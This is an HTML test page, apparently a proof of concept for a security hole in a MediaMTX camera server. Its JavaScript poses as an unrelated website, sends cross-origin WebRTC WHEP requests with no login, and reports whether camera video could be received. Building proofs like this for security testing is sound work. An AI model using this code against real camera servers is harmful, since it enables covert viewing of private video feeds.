<!doctype html>
<meta charset="utf-8">
<title>another website</title>
<body style="font:12px Consolas,monospace;background:#300;color:#fcc">
<div id="o">this page stands for any web page the Operator might visit. It is served from a different origin than MediaMTX and tries to open a WebRTC session to read a camera, with no login.</div>
<script>
// Test page for the Stage 1A hole proof (not part of the product). Query: run=<id>  targets=<label>=<url up to but excluding /whep>,...
// For each target: create a receive-only peer connection, POST the offer to <url>/whep from THIS (foreign) origin, and
// report whether the request was allowed, whether an answer came back and whether any video frame was decoded.
const q = new URLSearchParams(location.search);
const RUN = q.get('run') || 'evil';
const TARGETS = (q.get('targets') || '').split(',').filter(Boolean).map(x => { const i = x.indexOf('='); return { label: x.slice(0, i), url: x.slice(i + 1) }; });
const post = o => fetch('/stats?run=' + encodeURIComponent(RUN), { method: 'POST', body: JSON.stringify(o) }).catch(() => {});
const gathered = (pc, ms) => new Promise(res => { if (pc.iceGatheringState === 'complete') return res(); const t = setTimeout(res, ms); pc.addEventListener('icegatheringstatechange', () => { if (pc.iceGatheringState === 'complete') { clearTimeout(t); res(); } }); });
async function attempt(t) {
  const r = { ev: 'result', label: t.label, origin: location.origin, outcome: '', status: null, framesDecoded: 0, t: Date.now() };
  const pc = new RTCPeerConnection({ iceServers: [] });
  try {
    pc.addTransceiver('video', { direction: 'recvonly' }); pc.addTransceiver('audio', { direction: 'recvonly' });
    const video = document.createElement('video'); video.muted = true; video.autoplay = true; document.body.append(video);
    pc.ontrack = e => { video.srcObject = e.streams[0]; };
    await pc.setLocalDescription(await pc.createOffer()); await gathered(pc, 2000);
    let resp;
    try { resp = await fetch(t.url + '/whep', { method: 'POST', headers: { 'Content-Type': 'application/sdp' }, body: pc.localDescription.sdp }); }
    catch (e) { r.outcome = 'blocked by the browser: ' + e; return r; }
    r.status = resp.status;
    if (resp.status !== 201) { r.outcome = 'answered HTTP ' + resp.status; return r; }
    r.outcome = 'SESSION GRANTED';
    await pc.setRemoteDescription({ type: 'answer', sdp: await resp.text() });
    for (let i = 0; i < 16 && !r.framesDecoded; i++) {
      await new Promise(res => setTimeout(res, 500));
      (await pc.getStats()).forEach(s => { if (s.type === 'inbound-rtp' && s.kind === 'video') r.framesDecoded = s.framesDecoded || 0; });
    }
    return r;
  } catch (e) { r.outcome = (r.outcome || '') + ' error: ' + e; return r; }
  finally { try { pc.close(); } catch (e) {} }
}
(async () => {
  post({ ev: 'start', t: Date.now(), origin: location.origin, ua: navigator.userAgent });
  for (const t of TARGETS) post(await attempt(t));
  post({ ev: 'done', t: Date.now() });
})();
</script>
